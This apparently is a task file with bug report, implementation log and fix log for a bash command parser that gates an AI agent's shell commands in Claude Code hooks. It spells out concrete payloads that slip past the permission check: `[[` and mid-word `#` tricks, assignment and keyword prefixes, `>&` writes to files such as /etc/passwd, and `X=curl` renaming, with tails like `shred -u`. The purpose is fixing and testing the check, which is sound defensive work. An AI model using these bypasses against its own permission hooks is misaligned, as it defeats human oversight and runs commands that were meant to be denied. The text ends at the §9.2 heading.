# Task 32 — Two tokens switch the separator scanner off, hiding every command after them (bug)

**Status:** done (rev 3 — round-3 review FAILED, the MECHANISM was replaced;
see §10; awaiting re-review) · **Type:** bug · **Created:** 2026-08-27 · **Rev:** 3
**Priority:** **critical — live on `main` and installed, no preconditions**
**Suggested worker:** implement → review → fix loop, background agents
**Scope:** `.claude/hooks/bash_command_parser.py`, `tests/`, this file.
**Read first:** §1 · [task 31](./31_ampersand_not_a_separator.md) (same class,
already fixed for `&`) · `tasks/22_agent_permission_flows/state.md` invariant 1
**Origin:** found by task 31's reviewer while answering "can a `&` still hide a
command?" — the answer was yes, twice, for reasons that have nothing to do with
`&`. Both independently reproduced by the manager.

## 1. The defects

Task 31 taught the parser that `&` separates commands. These two make the
parser stop looking for **any** separator — `;`, `|`, `&&` and `&` alike — from
the offending token to the end of the string. Everything after is folded into
one sub-command whose head is the first, allowlisted, command.

### (a) An unmatched `[[` suppresses separators to end of string

`bash_command_parser.py:400` (`in_conditional`) and `:790` (the operator gate).
`flush_current` sets `in_conditional = True` for **any** flushed token whose
text is `[[`, ungated by `at_cmd_start`, and only a matching `]]` clears it.

```
echo [[ ; nslookup example.com    -> allow
echo [[ & nslookup example.com    -> allow
echo [[ && nslookup example.com   -> allow
echo ok ; nslookup example.com    -> ask     (control)
```

Real bash under `set -T` runs two commands: `RUN[echo [[]`, `RUN[nslookup …]`.

### (b) A mid-word `#` eats the rest of the line

`bash_command_parser.py:806`. The comment handler fires on any unquoted `#`,
not only one at a word boundary. Bash only starts a comment at a word boundary,
so `ok#c` is an ordinary argument and the line continues.

```
echo ok#c ; nslookup example.com  -> allow
echo ok#c & nslookup example.com  -> allow
```

Bash truth, measured:

```
$ bash -c 'set -T; trap ...DEBUG; echo ok#c ; printf "hidden\n"'
  RUN[echo ok#c]
ok#c
  RUN[printf "hidden\n"]
hidden
```

The tail really runs. Both are **pre-existing** — identical on HEAD before task
31 — and neither is `&`-specific.

## 2. Severity

Same shape as task 31 and just as unconditional: an allowlisted head, one extra
token, and anything after it is invisible. `echo ok#c ; <anything>` allows.
Epic 22 invariant 1 stays false until this lands — task 31 closed one door of
three.

Note both are *suppression* bugs rather than *tokenising* bugs: the fix in each
case is to narrow when the suppressing state may be entered, not to add an
operator.

## 3. The fix

**(a)** Enter `in_conditional` only when `[[` appears at command position
(`at_cmd_start`), the way bash treats it as a reserved word. Decide explicitly
what an *unterminated* `[[` should do — bash rejects the command outright, so
failing to `ask` is defensible and is the safe direction. Do not simply clear
the flag at the next separator; that reintroduces the hole for a genuine
`[[ a && b ]]`.

**(b)** Treat `#` as starting a comment only at a word boundary — start of
input, or preceded by unquoted whitespace or an operator — matching bash. Verify
against `echo ok#c`, `echo a#b#c`, `url=http://x/#frag`, `echo '#'`,
`echo "#"`, `echo \#`, and a genuine trailing ` # comment`.

**Also fold in, found by the same review:** `>& file` is an exact synonym for
`&> file` in bash, but `>&` sits in `REDIRECTIONS_NO_ARG`, so
`cmd >& /tmp/f` yields `['cmd /tmp/f']` and `extract_write_redirect_targets`
returns `[]` — the write-destination gate is blind to it. Task 31 added `&>`
and left its synonym, so this is now an asymmetry in the same table.

## 4. Tests

Each watched to fail first, output quoted:

1. Both §1 cases split correctly and no longer allow, for `;`, `&`, `&&`, `|`.
2. `[[` at command position still suppresses correctly: `[[ a && b ]]` stays one
   sub-command; `[[ -f x ]] && echo hi` splits on the `&&` outside the `]]`.
3. An unterminated `[[` at command position reaches whatever §3 decides, pinned
   explicitly.
4. `#` word-boundary matrix from §3(b), both directions.
5. `cmd >& /tmp/f` is one sub-command AND `extract_write_redirect_targets`
   reports `/tmp/f`.
6. **Regression floor:** the 21 forms pinned verbatim by task 31's
   `TestAmpersandIsACommandSeparator` stay green, and the 240-case real-bash
   oracle (`TestTrapHandlerAgainstRealBash`) stays green with no new exemptions.

## 5. Constraints

- **Shared checkout.** Never `git checkout`/`stash`/`reset`/`restore`, with or
  without a pathspec. Mutation-test in `/tmp` copies.
- **A repo edit is not live.** Do not run `./install-claude-config.sh`.
- This module is consumed by `pretool_hook.py`, `permissions_mcp_lib.py:202`,
  `telegram_permission_router.py:408` and `tests/scenario_check.py`. Report the
  blast radius.
- Differential sweep over commands harvested from
  `~/.claude/bash_hook_debug.log*` and `~/.claude/permission_requests.jsonl`,
  reporting direction of every change. Task 31's lesson: the honest claim is
  **"every move toward allow is bash-faithful"**, verified against real bash —
  not "nothing moved toward allow". Prove faithfulness, don't assert absence.
- Ground-truth with `set -T` + a `DEBUG` trap recording `$BASH_COMMAND`, inert
  payloads only (`printf`, `echo`, `pwd`). Note `_assert_probe_safe` in the test
  file refuses to spawn bash for non-inert commands.

## 6. Done criteria

1. Both suppressions narrowed; `>&` symmetric with `&>`.
2. §4's tests present and green, naming which were watched to fail.
3. Full suite green, counts reported. Baseline at filing: **1393 ran, OK, 1
   skipped** (`test_headless_spawn`).
4. This file updated with an implementation log.
5. A sentence in `tasks/22_agent_permission_flows/state.md`'s Log on whether
   invariant 1 is finally whole, or what still stands between it and true.

## 7. The remaining known gaps, for whoever closes this

After this, the open parser/validator holes are:

- **task 30** — `workspace_binary` / `workspace_rm` / `local_function` outrank
  deny and ask.
- **name resolution** — the validator vouches for a *name*, not for what the
  name resolves to at run time: `X=echo; f(){ $X http://e/x; }; trap f EXIT;
  X=curl` allows. Filed as [task 33](./33_name_resolution_not_vouched.md).
- **NUL fail-open** — a NUL in a redirect target raises out of
  `_resolve_target_path`; `main()`'s blanket except turns it into `sys.exit(0)`,
  an allow. Filed as [task 34](./34_nul_byte_fail_open.md).
- `(( a & b ))` mis-splits toward `ask` (harmless, task 31 §8.8).

---

## 8. Implementation log (rev 1 — implementer)

**Status:** done · **Landed:** 2026-08-27 · **Baseline commit:** `ca2a81a`
**Not installed.** `./install-claude-config.sh` was not run; everything measured
below is the repo working tree at `/data/sync/work/leangeeks-ai/claude-hooks`.
The installed copies under `~/.claude/hooks/` still carry both bugs until
someone reinstalls.

### 8.1 What changed

All four edits are in `.claude/hooks/bash_command_parser.py`. Every one
**narrows when a suppressing state may be entered** — no operator was added,
no table entry moved between `REDIRECTIONS_*` lists.

**(a) `[[` only opens the conditional at command position — `:455`**

```python
if token_str == '[[' and at_cmd_start and _allow_conditional:
    in_conditional = True
```

`at_cmd_start` already existed (it gates `case` recognition) and, read inside
`flush_current` *before* the trailing update at `:463`, it means exactly "this
token is at command position" — which is where bash reads `[[` as a reserved
word and nowhere else. `]]` still clears the flag ungated.

**(b) An UNTERMINATED `[[` retries with the conditional disabled — `:922`**

```python
if in_conditional and _allow_conditional:
    return self._tokenize_with_quotes(command, _allow_conditional=False)
```

`_tokenize_with_quotes` gained an internal `_allow_conditional=True` parameter
(`:319`). The recursion is one level deep by construction: with the flag False
`in_conditional` can never become True. **Decision (§3, §4.3):** an unterminated
`[[` does **not** keep the suppression. bash rejects such a command outright —
`bash -c '[[ -f x ; nslookup evil'` is a syntax error and **nothing runs** — so
no split can be unfaithful to what executes, while keeping the suppression would
leave a live bypass gated only on our `]]` detection being exactly as good as
bash's. The retry surfaces the hidden commands and so fails toward `ask`, which
is the safe direction the brief asked for. Clearing the flag at the next
separator was the alternative and is wrong: it reopens the hole for a genuine
`[[ a && b ]]`.

(a) and (b) are **independent**, and each covers cases the other cannot — see
the M1/M2 mutations in §8.4. (b) alone handles `echo [[ ; nslookup evil`
(nothing ever closes the conditional). (a) alone handles
`echo [[ ; nslookup evil ]]`, where a later `]]` closes it and the retry never
fires.

**(c) `#` starts a comment only at a word boundary — `:875`**

```python
if char == '#' and in_quote is None and not current and not word_open:
```

bash: *"A word beginning with `#` causes that word and all remaining characters
on that line to be ignored"* — beginning with, not containing. `not current` is
the ordinary word-boundary test. `word_open` (`:409`, cleared at the top of
`flush_current` `:416`, set at `:664`/`:687`/`:709`) covers the one shape where
the buffer is empty *mid-word*: a glued `$(...)`, backtick or `<(...)` that was
lifted into its own token. Without it `echo $(date)#x ; nslookup evil` still hid
its tail — the same defect through a different door. A quoted or escaped `#`
never reaches this branch at all, and an escaped space keeps `current`
non-empty, so `echo a\ #b` stays one word exactly as in bash.

**(d) `>& FILE` is reported as `&> FILE` — `:967`, `:981`**

`_check_operator` now returns `'&>'` for a `>&` whose operand is a path, via the
new `_is_bare_amp_write_redirect`. Both spellings are two characters, so the
caller's `i += len(op)` is unaffected and no other code had to change: `&>` is
already in `REDIRECTIONS_WITH_ARG` and `WRITE_REDIRECTIONS_WITH_ARG`, so the
target stops leaking out as an argument and starts reaching
`extract_write_redirect_targets`. The helper encodes bash's two rules, both
measured (§8.5):

1. only a **bare** `>&` has the synonym reading. With a pure-numeric-word fd
   prefix (`3>& file`) bash demands an fd operand and fails the redirection with
   *"ambiguous redirect"* — nothing is written — so those stay on the fd-dup
   path, unchanged. The prefix test walks back over the digit run and requires a
   metacharacter before it, so `foo3>&bar` is the word `foo3` plus a bare `>&`,
   exactly as bash reads it.
2. the operand decides: a digit run (`>&2`, `>& 1`) or `-` (`>&-`, `>& -`) is
   duplication/close and writes to no path; anything else is the file operand.

`>&` stays in `REDIRECTIONS_NO_ARG` for reading 1; the comment at `:41`-`:45` now says
why it is in both readings.

`OPERATORS`, `REDIRECTIONS`, `REDIRECTIONS_WITH_ARG`, `REDIRECTIONS_NO_ARG`,
`WRITE_REDIRECTIONS_WITH_ARG`, `_split_on_operators`, `_normalize_command`, the
`case` state machine, heredocs and process substitution are otherwise untouched.

### 8.2 Blast radius (§5 third bullet)

Everything downstream of `_tokenize_with_quotes`. Verified consumer by
consumer, not assumed:

| Consumer | Effect |
|---|---|
| `parse_compound_command` / `parse_with_offsets` | more sub-commands wherever a `[[` argument or a mid-word `#` was hiding one; **never fewer** — 0/2194 commands in the sweep lost a sub-command |
| `pretool_hook.BashPermissionValidator.validate_bash_command` | the hidden tail is now classified — the fix |
| `extract_write_redirect_targets` / `_scan_write_targets` | gains the `>& FILE` destination it was blind to; `2>&1`/`>&2`/`n>&m` still report nothing |
| `extract_assignments` | a value containing `#` is no longer truncated (`url=http://x/#frag` was `http://x/`). Note the *narrowing* side effect: `http://x/#frag` is not a `_CONSTANT_VALUE_RE` constant, so `_expand_constants` no longer substitutes it — strictly toward `ask` |
| `pretool_hook._raw_token_values` / `_recover_raw_handler` (task 28) | a `trap` sitting after a `[[` argument or a mid-word `#` is now *reached at all*; the real-bash oracle stayed green with **no new exemptions** (275 subtests, unchanged) |
| `permissions-mcp/permissions_mcp_lib.py:202` (`_build_validator`) | inherits with no code edit — probed directly: `echo ok#c ; shred -u /tmp/x` → `deny` |
| `.claude/hooks/telegram_permission_router.py:408` | same — probed: `echo [[ & shred -u /tmp/x` → `deny` |
| `tests/scenario_check.py` | byte-identical output before and after (see below) |

`tests/scenario_check.py` prints the same two pre-existing failures on the
unmodified copy and on the fixed tree — `git push --force should return 'deny'`
(named in the brief) and `ERROR in Decision Mapper: 'reason'`. `diff` of the two
runs' failure lines: identical. Neither is touched by this change.

### 8.3 Tests watched to fail first

New class `TestSeparatorSuppressionTokens` in `tests/test_integration_pretool.py`
— **26 methods, 99 subtests**. Run against the **pre-fix** parser (a `cp -a`
copy of HEAD's tree with only the new test file dropped in): **15 methods fail,
50 subtest failures**; the other 11 are guards (below). First failure per
method, verbatim:

```
test_bracket_argument_does_not_suppress_any_separator (separator=';')
  AssertionError: Lists differ: ['echo [[ ; nslookup example.com']
                             != ['echo [[', 'nslookup example.com']

test_bracket_argument_does_not_launder_the_tail (separator=';')
  AssertionError: 'allow' != 'ask'

test_bracket_argument_does_not_downgrade_a_deny
  AssertionError: 'allow' != 'deny'

test_bracket_argument_closed_later_still_splits
  AssertionError: Lists differ: ['echo [[ ; nslookup e.com ]]']
                             != ['echo [[', 'nslookup e.com ]]']

test_midword_hash_does_not_suppress_any_separator (separator=';')
  AssertionError: Lists differ: ['echo ok'] != ['echo ok#c', 'nslookup example.com']

test_midword_hash_does_not_launder_the_tail (separator=';')
  AssertionError: 'allow' != 'ask'

test_midword_hash_does_not_downgrade_a_deny
  AssertionError: 'allow' != 'deny'

test_hash_mid_word_is_an_argument (command='echo ok#c')
  AssertionError: Lists differ: ['echo ok'] != ['echo ok#c']

test_hash_after_a_glued_substitution_is_not_a_comment
        (command='echo $(date)#x ; nslookup example.com')
  AssertionError: 'nslookup example.com' not found in ['echo', 'date']

test_fragment_url_keeps_its_fragment
  AssertionError: Lists differ: [('url', 'http://x/', 0)]
                             != [('url', 'http://x/#frag', 0)]

test_unterminated_conditional_splits_and_asks
  AssertionError: Lists differ: ['[[ -f x ; nslookup example.com']
                             != ['[[ -f x', 'nslookup example.com']

test_unterminated_conditional_does_not_downgrade_a_deny
  AssertionError: 'allow' != 'deny'

test_amp_write_redirect_synonym_reports_its_target (command='cmd >& /tmp/f')
  AssertionError: Lists differ: ['cmd /tmp/f'] != ['cmd']

test_amp_write_redirect_synonym_is_symmetric_with_amp_gt (tail='/tmp/f')
  AssertionError: Lists differ: ['cmd /tmp/f'] != ['cmd']

test_amp_write_redirect_synonym_really_writes_the_file
  AssertionError: Lists differ: [] != ['/tmp/tmpwh_ct9si/out']

test_bash_runs_what_the_parser_reports (command='echo [[ ; printf hi')
  AssertionError: 1 != 2 : bash runs ['echo [[', 'printf hi']
                           but the parser reported ['echo [[ ; printf hi']
```

The remaining **11 methods are GUARDS — green before AND after**, and nothing
here claims otherwise. They are the §4.6 regression floor:
`test_unchanged_forms_are_unchanged` (12 forms),
`test_conditional_at_command_position_still_suppresses`,
`test_connector_outside_the_conditional_still_splits`,
`test_conditional_is_recognised_after_a_keyword`,
`test_conditional_after_a_separator_is_recognised`,
`test_closing_bracket_inside_quotes_does_not_close_the_conditional`,
`test_balanced_bracket_arguments_are_one_command`,
`test_hash_at_a_word_boundary_is_a_comment` (7 forms),
`test_trailing_comment_still_hides_nothing_real`,
`test_fd_duplication_forms_are_unchanged` (10 forms), and
`test_amp_write_redirect_synonym_really_writes_the_file`'s bash half.
`test_balanced_bracket_arguments_are_one_command` is a guard for the *reverse*
direction: the gate must not start splitting `echo [[ ]] ; cmd`, which bash runs
as one command plus one.

Task 31's `TestAmpersandIsACommandSeparator` (17 methods, 21 subtests) and
`TestConditionalExpression` stayed green throughout, untouched.

### 8.4 Mutation matrix — every component is pinned

Run in a `/tmp` copy (`cp -a`), never in the repo. Each mutation deletes exactly
one piece of the fix and runs the four relevant classes (51 methods):

```
M1  drop `at_cmd_start` from the `[[` gate          FAILED (failures=3)
M2  drop the unterminated-`[[` retry                FAILED (failures=2)
M3  drop `not word_open` from the `#` gate          FAILED (failures=4)
M4  drop the `>&` -> `&>` normalization             FAILED (failures=7)
M5  drop the fd-prefix guard (rule 1)               FAILED (failures=2)
M6  drop `not current` from the `#` gate            FAILED (failures=22)
M7  make `>&` unconditionally `&>` (rule 2 dropped) FAILED (failures=6)
```

**M1 initially PASSED.** The first version of the test class covered only
unterminated `[[`, which the retry (M2) handles on its own — so the
command-position gate was unpinned and a future edit could have deleted it
silently. `test_bracket_argument_closed_later_still_splits` and three
ground-truth payloads (`echo [[ ; printf hi ]]`, `echo [[ && printf hi ]]`,
`echo [[ ]] ; printf hi`, `echo [[ x ]] ; printf hi`) were added specifically to
isolate it; M1 now fails on exactly those. Recorded because it is the same trap
as *"green suites hide unverified requirements"*.

### 8.5 Ground truth against real bash

`set -T` + a `DEBUG` trap recording `$BASH_COMMAND` enumerates exactly the
commands bash runs *separately*. 19 inert payloads (`printf`/`echo`/`pwd`/`true`
only) are pinned as `test_bash_runs_what_the_parser_reports`, which asserts
`len(sub_commands) == len(bash runs)` — **19/19 match**, and every one of them
is a case where the pre-fix parser reported strictly fewer:

```
echo [[ ; printf hi          bash: ['echo [[', 'printf hi']              parser 2  (pre: 1)
echo [[ & printf hi          bash: ['echo [[', 'printf hi']              parser 2  (pre: 1)
echo [[ && printf hi         bash: ['echo [[', 'printf hi']              parser 2  (pre: 1)
echo [[ | printf hi          bash: ['echo [[', 'printf hi']              parser 2  (pre: 1)
echo [[ ; printf hi ]]       bash: ['echo [[', 'printf hi ]]']           parser 2  (pre: 1)
echo [[ && printf hi ]]      bash: ['echo [[', 'printf hi ]]']           parser 2  (pre: 1)
echo [[ ]] ; printf hi       bash: ['echo [[ ]]', 'printf hi']           parser 2
echo ok#c ; printf hi        bash: ['echo ok#c', 'printf hi']            parser 2  (pre: 1)
echo a#b#c & printf hi       bash: ['echo a#b#c', 'printf hi']           parser 2  (pre: 1)
[[ a == a && b == b ]]       bash: ['[[ a == a && b == b ]]']            parser 1
[[ a == a ]] && printf hi    bash: ['[[ a == a ]]', 'printf hi']         parser 2
printf a # comment           bash: ['printf a']                          parser 1
echo $(pwd)#x ; printf hi    bash: ['echo $(pwd)#x', 'pwd', 'printf hi']  parser 3  (pre: 2)
```

Also measured directly, and pinned by
`test_amp_write_redirect_synonym_really_writes_the_file`:

```
$ bash -c 'set -T; trap ... DEBUG; echo x >& /tmp/gt_out_1'
  RUN[echo x >&/tmp/gt_out_1]
$ cat /tmp/gt_out_1
x                      # `>& FILE` really writes FILE, exactly like `&> FILE`

$ bash -c 'printf x 3>& /tmp/f3'
  bash: line 1: f3: ambiguous redirect      # an fd prefix has no synonym reading
$ bash -c 'printf x >& -'                   # `-` closes the fd, creates nothing
$ bash -c '[[ -f x ; printf hi'
  bash: syntax error near `;'               # unterminated `[[`: NOTHING runs
```

The DEBUG-trap harness spawns bash only through `_assert_probe_safe`, the
existing interlock that refuses non-inert commands; every payload is
`printf`/`echo`/`pwd`/`true` and the one file write goes to a
`tempfile.mkdtemp()` directory that is removed in a `finally`.

### 8.6 Differential sweep (§5 fourth bullet)

Corpus: **2194** distinct commands — 2136 harvested from this machine's
`~/.claude/bash_hook_debug.log*` (`Validating command:` lines, including all
five rotated `.gz` archives) and every `command` field in
`~/.claude/permission_requests.jsonl`, plus 58 curated cases covering the two
defects, every `#` position and every `&`-bearing redirection form. Both passes
run the **same** merged settings, asserted inside the harness before any result
is trusted: `SettingsLoader.load_all_settings()` → **allow=295, deny=9, ask=0**
(the numbers task 31 was filed against). 0 parse exceptions in either pass; the
post pass is reproducible byte-for-byte.

```
corpus size:                                    2194
verdict changed:                                  13
sub-command split changed:                        25
write-target list changed:                         7
  allow -> ask      13
MOVED TOWARD allow:                                0
commands that ended up with FEWER sub-commands:    0
verdict changes on HARVESTED (real) commands:      0
split changes on HARVESTED (real) commands:        2
```

All 13 verdict changes are the curated bypasses closing:

```
allow -> ask   'echo [[ ; nslookup example.com'      ['echo [[ ; nslookup example.com']  ->  ['echo [[', 'nslookup example.com']
allow -> ask   'echo [[ & nslookup example.com'      (and && | || likewise)
allow -> ask   'echo ok#c ; nslookup example.com'    ['echo ok']  ->  ['echo ok#c', 'nslookup example.com']
allow -> ask   'echo a#b#c && nslookup example.com'  ['echo a']   ->  ['echo a#b#c', 'nslookup example.com']
allow -> ask   'echo $(date)#x ; nslookup ...'       ['echo', 'date'] -> ['echo #x', 'nslookup example.com', 'date']
allow -> ask   '[[ -f x ; nslookup example.com'      ['[[ -f x ; nslookup example.com'] -> ['[[ -f x', 'nslookup example.com']
allow -> ask   'echo x >& /etc/passwd'               ['echo x /etc/passwd'] -> ['echo x'] + write target /etc/passwd
```

**Both real-world split changes are commands the bug was hiding.** The second is
the one that matters — nobody typed a bypass, they typed a parameter expansion:

```
gdscript_check() {
  local file=$1
  /usr/local/bin/godot ... preload("res://'${file#res://}'").new()); quit()' 2>&1 | grep -i error || echo "OK"
}
# Simple existence check instead
head -10 .../overlay.gd | tail -5

  pre  (5 sub-commands): ... '/usr/local/bin/godot ... "res://'${file'  , 'head -10 ...', 'tail -5'
  post (7 sub-commands): ... '...${file#res://}'' , 'grep -i error', 'echo "OK"', 'head -10 ...', 'tail -5'
```

`${file#res://}` is bash parameter expansion (measured: `f=res://x;
printf "%s\n" "${f#res://}"` prints `x`), and the old comment handler ate the
line from that `#` — hiding `grep -i error` and `echo "OK"` from the validator
entirely. Both happen to be allowlisted, so the verdict did not move; had either
been denied, it would have allowed. The genuine trailing
`# Simple existence check instead` comment is still read as a comment.

The other real change is a `cat <<'EOF'` markdown body whose `# Email Portal`
heading used to truncate the whole command; it now tokenizes further. Verdict
unchanged (`ask` → `ask`).

**Faithfulness of every move toward allow (task 31 §8.9's lesson).** The
harvested corpus produced none, but *"there are none"* is not the claim — it is
a property of this corpus. A systematic scan of **270** combinations (10 heads,
chosen so an extra argument can change the verdict, × 27 shapes touching all
four edits) finds:

```
allow -> ask     22
allow -> deny    12      (the deny-defeating bypass closing; epic 22 D1)
ask   -> deny     1
ask   -> allow   10      <-- the moves toward allow, all of two shapes
```

Both shapes are **bash-faithful**, and each has a control that already allowed
before the fix — which is the proof, not an argument:

*Shape 1 — `pwd >& /tmp/f` (2 cases).* `Bash(pwd)` is an exact-form allow, so
the leaked path used to make it `pwd /tmp/f` → `ask`.

```
                     pre     post   post split
'pwd > /tmp/f'       allow   allow  ['pwd']      <- control, unchanged
'pwd 2> /tmp/f'      allow   allow  ['pwd']      <- control, unchanged
'pwd &> /tmp/f'      allow   allow  ['pwd']      <- exact synonym, unchanged
'pwd >& /tmp/f'      ask     allow  ['pwd']      <- was the odd one out
'pwd /tmp/f'         ask     ask    ['pwd /tmp/f']  <- still asks, as it must
```

bash, measured: `RUN[pwd >&/tmp/f]` — one command, `pwd`, and the file is
created containing the cwd. The write destination `/tmp/f` is now *also*
reported to the write-destination gate, where before it was reported as nothing.
Strictly more information, and the verdict matches the three spellings that
mean the same thing.

*Shape 2 — `X=/usr/bin/git#f ; <cmd>` (8 cases).* Pre-fix the `#f ; <cmd>` tail
was eaten as a comment, leaving an assignment-only command whose sub-command
list was **empty** — so the old `ask` was the validator being totally blind, not
the validator being careful.

```
'X=/usr/bin/git ; pwd'      allow -> allow   ['pwd']     <- control, unchanged
'X=/usr/bin/git#f ; pwd'    ask   -> allow   ['pwd']
```

bash, measured: `RUN[X=/usr/bin/git#f]` then `RUN[pwd]` — the assignment runs no
command and the tail is exactly `pwd`. The same shape with a denied tail is the
`ask -> deny` case in the table (`X=/usr/bin/git#f ; shred -u /tmp/x` →
`deny`): the tail is now seen, whichever way it classifies.

So the defensible claim, stated the way task 31 §8.9 says it must be: **every
move toward allow is bash-faithful**, verified against real bash and against a
pre-existing control that already allowed.

### 8.7 Decisions differing from the brief

1. **Two mechanisms for `[[`, not one.** §3(a) asks for the `at_cmd_start` gate
   and to decide the unterminated case separately. Both turned out to be
   *necessary*, and neither subsumes the other (§8.4 M1/M2). The gate is what
   handles an argument `[[` that a later `]]` closes; the retry is what handles
   one that nothing closes.
2. **The `#` fix needed `word_open` as well as the word-boundary test.** §3(b)
   says "start of input, or preceded by unquoted whitespace or an operator". A
   literal reading (empty token buffer) still hides
   `echo $(date)#x ; nslookup evil`, because the buffer *is* empty after a glued
   substitution is lifted into its own token. A prev-character reading fails the
   other way on `echo a\ #b`. `not current and not word_open` is the pair that
   matches bash on both.
3. **`>&` was normalized to `&>` rather than moved between the redirection
   tables.** Moving it to `REDIRECTIONS_WITH_ARG` would break the four fd-dup
   forms task 31 pinned verbatim (`cmd >&2 -> ['cmd 2']`, `cmd 3>&1`,
   `cmd 0<&3`, `cmd 2>&-`) and would report an fd number as a write target.
   Which reading applies is operand-dependent in bash, so it is decided at the
   operator scan and expressed as the spelling that already has the right
   handling everywhere.
4. **`cmd 2>& /tmp/f` and `cmd 3>& /tmp/f` are deliberately left alone**
   (`['cmd 2 /tmp/f']`). bash calls those "ambiguous redirect" and writes
   nothing, so there is no destination to gate; pinned by
   `test_fd_duplication_forms_are_unchanged` so a future edit must notice them.
5. **The unterminated-`[[` retry is a second tokenizer pass, not a state
   tweak.** It costs one extra pass on a command bash would reject anyway, it
   cannot recurse (the flag it sets forbids the state that triggers it), and it
   reuses the real tokenizer instead of a hand-rolled forward scan for `]]`,
   which would have had to re-derive quote handling.

### 8.8 Results

| | before | after |
|---|---|---|
| `tests/run_all_tests.py` | 1393 ran, OK, 1 skipped | **1419 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 passed / 0 failed | 107 passed / 0 failed |
| `TestTrapHandlerAgainstRealBash` | 6 tests, 275 subtests | 6 tests, **275 subtests** — no new exemptions |
| `TestSeparatorSuppressionTokens` | — | 26 tests, 99 subtests |
| `tests/scenario_check.py` | 2 pre-existing failures | identical, byte for byte |

The one skip is `test_headless_spawn`, unchanged. `_TASK_31_KNOWN_FAILING`
stayed deleted; no exemption list was reintroduced.

### 8.9 Residual risk

- **Not installed.** `~/.claude/hooks/bash_command_parser.py` still carries both
  bugs until `./install-claude-config.sh` runs. This is the largest remaining
  exposure and it is an operator action.
- **`$(...)` glued into a word still loses its text.** `echo $(date)#x`
  normalizes to `echo #x` — the substitution's literal text is dropped from the
  surrounding word (pre-existing, unrelated to this task). The *separator* is
  now correctly found, which is what mattered; the residue is a stray argument,
  never a head.
- **A `${var#pat}` parameter expansion is only handled by accident.** The `#`
  there is mid-word so the word-boundary test covers it, but the parser has no
  model of `${...}` — a `}` is an ordinary character. `${var#a;b}` would still
  split on the `;`. Direction-safe (toward `ask`), and unchanged by this task.
- **Pathological heredoc-ish text produces noisy write targets.** The markdown
  `cat <<'EOF'` command in §8.6 now reports six bogus targets (`brand_id`,
  `**This`, …) where it reported none. They only make the write-destination gate
  stricter, and the command's verdict is unchanged, but a future write-gate that
  hard-denies on unresolvable targets should know this shape exists.
- **`(( a & b ))` still mis-splits** toward `ask` (task 31 §8.8, unchanged).
- **The `n>&word` ambiguous-redirect forms keep their stray argument words**
  (§8.7 item 4) — extra arguments on an existing sub-command, never a new head.

### 8.10 What §7 leaves open

Unchanged by this task and still live: **task 30**
(`workspace_binary`/`workspace_rm`/`local_function` outrank deny and ask),
**name resolution** (the validator vouches for a name, not for what it resolves
to at run time), and **NUL fail-open** (`main()`'s blanket `except` turns a NUL
in a redirect target into `sys.exit(0)`). The last two are filed:
[task 33](./33_name_resolution_not_vouched.md) and
[task 34](./34_nul_byte_fail_open.md) — both landed at `ca2a81a`, the same
commit range as this task, which is why round 1 recorded them as unfiled.

---

## 9. Fix log (rev 2 — fixer, after the round-2 review FAILED)

**Status:** done · **Landed:** 2026-08-27 · **Baseline commit:** `ca2a81a`
**Still not installed.** `./install-claude-config.sh` was not run. Everything
below is the repo working tree; `~/.claude/hooks/` still carries the round-1
code, which means it carries the CRITICAL below.

The round-2 review failed the rev-1 implementation: **defect §1(a) was still
live, reachable by prepending four characters.** One MEDIUM regression, two LOW
findings and two documentation errors came with it. All are fixed; nothing was
deferred.

### 9.1 CRITICAL — `X=1 [[ ; evil ]]` reopened §1(a) verbatim

Rev 1 gated the conditional on `at_cmd_start` (§8.1a). What it did not check is
what *closes* command position. `:462` carried a carve-out from the `case`
commit `46ca76e`:

```python
if tokens[-1][0] != 'ENV':
    at_cmd_start = token_str in self.CMD_POSITION_WORDS
```

An `ENV` token deliberately left `at_cmd_start` **True**, so a `KEY=VALUE`
prefix put the next word back at command position and the `[[` after one was
read as the reserved word again:

```
X=1 [[ ; shred -u /tmp/x ]]        rev 1: allow    <-- the bypass, restored
A=1 B=2 [[ ; shred -u /tmp/x ]]    rev 1: allow
echo [[ ; shred -u /tmp/x          rev 1: deny     (§8.1a working)
```

The trailing `]]` closes the conditional, so §8.1d's unterminated-`[[` retry
never fires and cannot cover for it. It reproduced with `X=`, `X=1`, `PATH=/x`
and multiple assignments, across `;`, `&`, `&&`, `||` and `|`, and through
every consumer — the reviewer measured it on `permissions_mcp_lib._build_validator()`
directly. **No payload in rev 1's 26 test methods carried a leading
assignment**, which is why it shipped.

**The same hole had a second door rev 1 also missed.** `at_cmd_start` was
assigned, never *carried*, so ANY `CMD_POSITION_WORDS` keyword reopened command
position wherever it appeared — including in argument position:

```
echo if [[ ; shred -u /tmp/x ]]    rev 1: allow    <-- same class, no assignment
echo do [[ | shred -u /tmp/x ]]    rev 1: allow
echo { [[ ; shred -u /tmp/x ]]     rev 1: allow
```

bash measured under `set -T`: `echo if [[ ; printf hi ]]` runs `echo if [[` and
then `printf hi ]]`. The `if` there is an ordinary argument.

**Fix — one line, and it closes both doors:**

```python
at_cmd_start = at_cmd_start and token_str in self.CMD_POSITION_WORDS
```

A keyword introduces a further command only when **it** is at command position;
everything else — an assignment prefix included — consumes the position. The
`if tokens[-1][0] != 'ENV'` carve-out is gone.

**Decision: the ENV carve-out was narrowed for BOTH consumers of the flag, not
just `[[`.** The review offered the narrower option (gate the carve-out for
`[[` only, keep it for the `case` machinery). Measured, bash rejects a reserved
word after an assignment prefix *everywhere*, so keeping it for `case` would
have been keeping a rule bash does not have:

```
X=1 [[ -f /etc/passwd ]]         bash: [[: command not found
X=1 case a in a) printf hi;; esac  bash: syntax error near unexpected token `)'
X=1 if true; then printf hi; fi    bash: syntax error near unexpected token `then'
X=1 while false; do :; done        bash: syntax error near unexpected token `do'
X=1 { printf hi; }                 bash: syntax error near unexpected token `}'
X=1 ! true                         bash: !: command not found
```

(The single exception measured is `X=1 time true`, which bash accepts. That
costs a *false ask* on `X=1 time [[ … ]]`, the safe direction, and no real
script was found using it — the 2073-command harvest in §9.6 contains none.)

The one thing the narrowing changes for `case` is the shape
`X=1 case a in a) cmd;; esac`: pattern mode is no longer entered, so the arm
body folds into the head sub-command instead of being emitted separately. That
was checked before accepting it — bash refuses the whole string as a syntax
error (nothing runs), the folded head is `case`, and `case` is in neither
`SAFE_BUILTINS` nor `SCAFFOLDING_KEYWORDS` nor any settings allow pattern, so
the verdict is `ask` (and `deny` when the body is denied). Pinned by
`test_assignment_prefix_does_not_open_a_case_pattern_list`.

### 9.2 MEDIUM — rev 1's gate broke `( [[ … ]] )`

